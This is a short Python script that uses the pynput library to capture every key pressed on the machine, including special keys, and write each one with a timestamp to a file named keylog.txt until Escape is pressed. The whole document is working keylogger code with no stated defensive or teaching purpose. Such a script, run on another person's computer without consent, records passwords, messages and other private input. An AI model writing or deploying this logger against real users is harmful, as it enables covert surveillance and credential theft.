import logging
from pynput.keyboard import Key, Listener

# Configure logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the alphanumeric keys
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Log special keys
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == Key.esc:
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
